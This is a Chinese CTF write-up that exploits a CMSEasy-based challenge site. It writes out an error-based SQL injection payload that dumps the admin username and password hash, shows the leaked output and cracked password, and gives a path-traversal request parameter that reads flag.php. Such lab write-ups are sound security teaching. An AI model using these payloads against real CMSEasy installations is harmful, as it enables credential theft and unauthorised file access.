# Yeser-CMS漏洞利用

[2018-09-20]()

刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下

> 题目内容：新的CMS系统，帮忙测测是否有漏洞。  
> tips:flag在网站根目录下的flag.php中

首先去百度了一下，是没有这个cms的，那么看一下这个网站看有没有有用的信息  
我看先看一下这个文件：`http://0b572aacb0994d6fb941349a346cae04c9d7fafc8afd42b6.game.ichunqiu.com/robots.txt`  
这个文件的作用是告诉我们哪些网站能爬，哪些不饿能爬，不过它里面有时候会放一些重要的东西

页面显示如下：  

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt for YeserCMS</span><br><span class="line"># Version 5.0.0</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Disallow:/admin/</span><br><span class="line">Disallow:/cache/</span><br><span class="line">Disallow:/common/</span><br><span class="line">Disallow:/config/</span><br><span class="line">Disallow:/fckeditor/</span><br><span class="line">Disallow:/htaccess/</span><br><span class="line">Disallow:/images/</span><br><span class="line">Disallow:/install/</span><br><span class="line">Disallow:/js/</span><br><span class="line">Disallow:/lib/</span><br><span class="line">Disallow:/template/</span><br><span class="line">Disallow:/upload/</span><br><span class="line">Disallow:/celive/</span><br><span class="line">Disallow:flag.php</span><br></pre></td></tr></tbody></table>

  
可以好几个比较重要的目录和文件

先放到这，然后我们继续寻找有用的信息  
在文档下载页面，随便点一个文档进去，拉到最下面的评论区可以在我要评论里面看到网站的框架是CMSEASY  
![](1.png)

```
百度了一下CMSeasy，发现这确实是一个CMS，而且是有漏洞的
https://www.seebug.org/appdir/CmsEasy
使用无限制报错注入
https://www.seebug.org/vuldb/ssvid-94084
```

这个网站存在报错注入，大概思路就是：  
通过报错注入获得管理员用户名和密码  
然后通过上边的`robots.txt`我们可以看到后台目录是：`/admin/`  
我们直接登陆后台，漏洞在后台页面上

接下来的问题就是如何获得用户名和密码，通过上边这篇文档提供的方法，直接把payload拿来用了：  
存在注入漏洞的页面是：`url/celive/live/header.php`  

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那么我们访问这个页面，同时postdata:xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,substring((SELECT/**/GROUP_CONCAT(username,password) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></tbody></table>

  
这样确实得到了回显，有用户名，但是密码好像是不全的  
![](2.png)

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">接下来直接只查看完整的密码的md5</span><br><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252c(UpdateXML(1%252cCONCAT(0x5b%252csubstring((SELECT%252f**%252fGROUP_CONCAT(username%252cpassword)%2bfrom%2byesercms_user)%252c7%252c39)%252c0x5d)%252c1))%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL)--%2b&lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br><span class="line">页面返回如下</span><br><span class="line">XPATH syntax error: '[f512d4240cbbdeafada404677ccbe61'&lt;br /&gt;&lt;br /&gt;INSERT INTO `yesercms_detail` (`chatid`,`detail`,`who_witter`) VALUES('','xxxxxx',(UpdateXML(1,CONCAT(0x5b,substring((SELECT/**/GROUP_CONCAT(username,password) from yesercms_user),7,39),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--  (2018-08-13 16:22:21)','2')</span><br></pre></td></tr></tbody></table>

![](3.png)  
然后就知道了

```
用户名admin，密码ff512d4240cbbdeafada404677ccbe61，md5解密为Yeser231。
```

这里推荐一个md5在线解码网站，可以直接解出来这个值：`http://www.dmd5.com/md5-decrypter.jsp`  
然后我们就可以进入后台了，在后台直接登陆就行

![](4.png)

登陆后就进入了后台  
还是查看的别人的文章，CMSeasy在后台有一个任意文件查看的漏洞  
我们点击`模板`，然后选择`当前模板编辑`，然后抓个包，点击编辑  
![](5.png)  
![](6.png)  
![](7.png)  
在包的最下边会看到：`&id=#footer_html`这个东西  
![](8.png)

把它修改成`&id=../../flag.php`  
这就是任意文件查看漏洞  
之后发送包，我们要的flag就出来了  
![](9.png)
